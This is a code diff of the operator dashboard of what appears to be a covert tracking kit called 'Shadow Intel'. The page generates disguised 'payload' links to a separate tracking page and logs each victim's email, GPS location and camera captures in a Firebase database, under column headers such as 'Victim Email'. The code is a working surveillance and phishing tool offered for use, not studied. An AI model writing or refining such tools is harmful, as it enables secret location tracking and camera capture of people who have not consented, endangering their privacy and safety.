@@ -2,55 +2,49 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Shadow Intelligence Dashboard</title>
+    <title>Shadow Intel | Master Control</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background: #020617; color: #e2e8f0; font-family: 'Inter', sans-serif; }
-        .card { background: rgba(30, 41, 59, 0.5); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.05); border-radius: 1.5rem; }
-        .input-box { background: #0f172a; border: 1px solid #1e293b; padding: 12px; border-radius: 12px; width: 100%; color: white; outline: none; transition: 0.3s; }
-        .input-box:focus { border-color: #3b82f6; box-shadow: 0 0 15px rgba(59, 130, 246, 0.2); }
+        body { background: #020617; color: #f1f5f9; font-family: 'Inter', sans-serif; }
+        .glass-panel { background: rgba(15, 23, 42, 0.9); border: 1px solid #1e293b; border-radius: 1.5rem; }
+        .status-pill { padding: 4px 12px; border-radius: 20px; font-size: 10px; font-weight: 900; text-transform: uppercase; }
     </style>
 </head>
 <body class="p-6">
     <div class="max-w-6xl mx-auto space-y-8">
         <div class="flex justify-between items-center">
-            <h1 class="text-3xl font-black italic text-blue-500">SHADOW<span class="text-white">CORE</span></h1>
-            <input type="text" id="search" onkeyup="searchLogs()" placeholder="Search ID..." class="bg-slate-800 border border-slate-700 rounded-lg px-4 py-2 text-xs w-48 outline-none">
+            <h1 class="text-3xl font-black italic text-blue-500">INTEL<span class="text-white">SHADOW</span></h1>
+            <input type="text" id="search" onkeyup="searchLogs()" placeholder="Search Unique ID..." class="bg-slate-900 border border-slate-800 rounded-xl px-4 py-2 text-xs w-64 text-blue-400 outline-none">
         </div>
 
-        <div class="card p-8 space-y-6">
+        <div class="glass-panel p-8 space-y-6 shadow-2xl">
             <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                <input type="email" id="targetEmail" placeholder="Target Email (Receiver)" class="input-box">
-                <input type="text" id="targetRed" placeholder="Redirect URL (e.g. https://google.com)" class="input-box">
+                <input type="email" id="targetEmail" placeholder="Receive Email" class="bg-black/50 border border-slate-700 p-4 rounded-xl outline-none focus:border-blue-500">
+                <input type="text" id="targetRed" placeholder="Redirect URL" class="bg-black/50 border border-slate-700 p-4 rounded-xl outline-none focus:border-blue-500">
             </div>
-            <button onclick="generateLink()" class="w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-xl font-black uppercase text-xs tracking-widest shadow-lg">Generate Shadow Link</button>
-            
-            <div id="outputBox" class="hidden p-4 border border-dashed border-blue-500/50 rounded-xl bg-blue-500/5">
-                <p class="text-[10px] font-bold text-blue-400 uppercase mb-2">Payload URL:</p>
-                <div class="flex gap-2">
-                    <input type="text" id="finalLink" readonly class="w-full bg-black/40 p-3 rounded-lg text-xs font-mono text-green-400 outline-none">
-                    <button onclick="copy()" class="bg-blue-500 px-4 rounded-lg text-xs font-bold uppercase">Copy</button>
-                </div>
+            <button onclick="deploy()" class="w-full bg-blue-600 hover:bg-blue-700 py-4 rounded-xl font-black uppercase text-xs tracking-widest shadow-lg">Generate Unique Transaction ID</button>
+            <div id="output" class="hidden p-4 border border-dashed border-blue-500/30 rounded-xl bg-blue-500/5 mt-4">
+                <input type="text" id="finalLink" readonly class="w-full bg-transparent p-2 text-xs font-mono text-green-400 outline-none mb-2">
+                <button onclick="copy()" class="bg-blue-600 px-4 py-2 rounded text-[10px] font-bold">COPY PAYLOAD</button>
             </div>
         </div>
 
-        <div class="card overflow-hidden">
-            <div class="p-4 border-b border-slate-700 bg-slate-800/30 flex justify-between items-center">
-                <h3 class="text-xs font-black uppercase text-slate-400">Intelligence Transactions</h3>
-                <span id="count" class="text-blue-400 font-bold text-xs">0 Records</span>
-            </div>
-            <div class="overflow-x-auto">
-                <table class="w-full text-left">
-                    <thead class="bg-black/20 text-[10px] font-bold text-slate-500 uppercase">
-                        <tr><th class="p-5">Unique ID</th><th class="p-5">Email</th><th class="p-5">Map Location</th><th class="p-5">Cam Status</th><th class="p-5 text-right">Time</th></tr>
-                    </thead>
-                    <tbody id="logList" class="divide-y divide-slate-800 text-xs font-bold"></tbody>
-                </table>
-            </div>
+        <div class="glass-panel overflow-hidden">
+            <table class="w-full text-left" id="intelTable">
+                <thead class="bg-black/40 text-[10px] font-black text-slate-500 uppercase">
+                    <tr>
+                        <th class="p-5">Transaction ID</th>
+                        <th class="p-5">Victim Email</th>
+                        <th class="p-5">Intelligence (GPS)</th>
+                        <th class="p-5">Camera Log</th>
+                        <th class="p-5 text-right">Time</th>
+                    </tr>
+                </thead>
+                <tbody id="logList" class="divide-y divide-slate-800 text-[11px] font-mono"></tbody>
+            </table>
         </div>
     </div>
 
@@ -63,37 +57,37 @@
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        function generateLink() {
+        function deploy() {
             const email = document.getElementById('targetEmail').value;
             const red = document.getElementById('targetRed').value;
-            if(!email || !red) return alert("Fill all details!");
+            if(!email || !red) return alert("All fields required");
 
-            const logId = "INTEL-" + Math.floor(100000 + Math.random() * 900000);
-            const fullLink = window.location.origin + window.location.pathname.replace('generator.html', 'track.html') + "?id=" + logId + "&email=" + email + "&red=" + encodeURIComponent(red);
+            const uniqueKey = db.ref().child('shadow_sessions').push().key; 
+            const link = window.location.origin + window.location.pathname.replace('generator.html', 'track.html') + "?session=" + uniqueKey + "&email=" + email + "&red=" + encodeURIComponent(red);
 
-            document.getElementById('finalLink').value = fullLink;
-            document.getElementById('outputBox').classList.remove('hidden');
+            document.getElementById('finalLink').value = link;
+            document.getElementById('output').classList.remove('hidden');
 
-            db.ref('shadow_intel/' + logId).set({
-                id: logId, email: email, redirect: red, location: "Waiting...", camStatus: "0/6", timestamp: Date.now()
+            db.ref('shadow_sessions/' + uniqueKey).set({
+                session_id: uniqueKey, target_email: email, redirect: red,
+                location: "Awaiting GPS...", progress: "0/6 Captures", time: Date.now()
             });
         }
 
-        db.ref('shadow_intel').on('value', snap => {
+        db.ref('shadow_sessions').on('value', snap => {
             const list = document.getElementById('logList');
             list.innerHTML = "";
-            let c = 0;
             snap.forEach(child => {
-                const l = child.val(); c++;
-                list.innerHTML = `<tr class="hover:bg-blue-500/5">
-                    <td class="p-5 text-blue-400">#${l.id}</td>
-                    <td class="p-5">${l.email}</td>
-                    <td class="p-5"><a href="${l.location}" target="_blank" class="text-blue-500 underline">${l.location}</a></td>
-                    <td class="p-5"><span class="bg-slate-800 px-2 py-1 rounded text-green-400 text-[10px]">${l.camStatus}</span></td>
-                    <td class="p-5 text-right text-slate-500 font-normal">${new Date(l.timestamp).toLocaleTimeString()}</td>
-                </tr>` + list.innerHTML;
+                const l = child.val();
+                list.innerHTML = `
+                    <tr class="hover:bg-blue-500/5">
+                        <td class="p-5 text-blue-400 font-bold">${l.session_id}</td>
+                        <td class="p-5 text-slate-400">${l.target_email}</td>
+                        <td class="p-5"><a href="${l.location}" target="_blank" class="text-green-500 underline underline-offset-4">${l.location}</a></td>
+                        <td class="p-5"><span class="bg-slate-800 px-3 py-1 rounded text-blue-400">${l.progress}</span></td>
+                        <td class="p-5 text-right text-slate-500">${new Date(l.time).toLocaleTimeString()}</td>
+                    </tr>` + list.innerHTML;
             });
-            document.getElementById('count').innerText = c + " Records";
         });
 
         function copy() { const e = document.getElementById('finalLink'); e.select(); document.execCommand('copy'); alert("Copied!"); }
